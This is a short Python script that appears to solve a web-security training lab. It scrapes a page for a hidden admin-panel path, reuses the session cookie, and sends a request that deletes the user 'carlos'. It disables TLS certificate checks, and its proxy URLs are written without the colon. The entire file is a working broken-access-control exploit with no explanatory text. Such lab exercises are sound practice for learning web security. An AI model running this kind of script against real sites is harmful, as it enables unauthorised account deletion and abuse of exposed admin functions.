import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def delete_user(url):        
        r = requests.get(url, verify = False, proxies = proxies)        
        #Retriving the session cookies 
        session_cookies = r.cookies.get_dict().get('session')
        #Retriving the admin panal
        soup = BeautifulSoup(r.text, 'lxml')
        admin_panal_instance = soup.find(text=re.compile('admin-'))
        print(admin_panal_instance)
        admin_path = re.search("href', '(.*)'", admin_panal_instance).group(1)
        print(admin_path)
        #Delete the user carlos 
        cookies = {'session':session_cookies}
        delete_carlos_url = url + admin_path + '/delete?username=carlos'
        r = requests.delete(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
        #Successful solving message 
        if r.status_code == 200:
            print('(+) Successfully deleted the user from the database ')
        else:
            print('(+) Failure to delete the user from the database')
            sys.exit(-1)  
        
def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)


    url = sys.argv[1]
    print(" (+) finding admin panal... ")
    delete_user(url)

if __name__ == '__main__':
    main()